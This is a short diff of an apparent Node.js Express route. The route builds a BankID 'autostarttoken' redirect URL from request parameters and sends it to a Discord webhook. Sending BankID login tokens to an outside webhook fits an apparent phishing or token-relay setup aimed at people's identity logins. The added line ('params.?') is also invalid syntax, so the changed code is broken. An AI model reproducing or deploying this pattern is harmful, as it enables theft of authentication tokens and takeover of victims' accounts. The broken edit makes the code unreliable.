@@ -23,7 +23,7 @@ app.get('/', (req, res) => {
 
   // Assuming you want to redirect to a specific URL with these parameters
   // Modify redirectUrl according to your requirements
-  const redirectUrl = `bankid:///?autostarttoken=${params.autostarttoken}`; // Adjust 'autostarttoken' based on your query parameter name
+  const redirectUrl = `bankid:///?autostarttoken=${params.?}`; // Adjust 'autostarttoken' based on your query parameter name
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
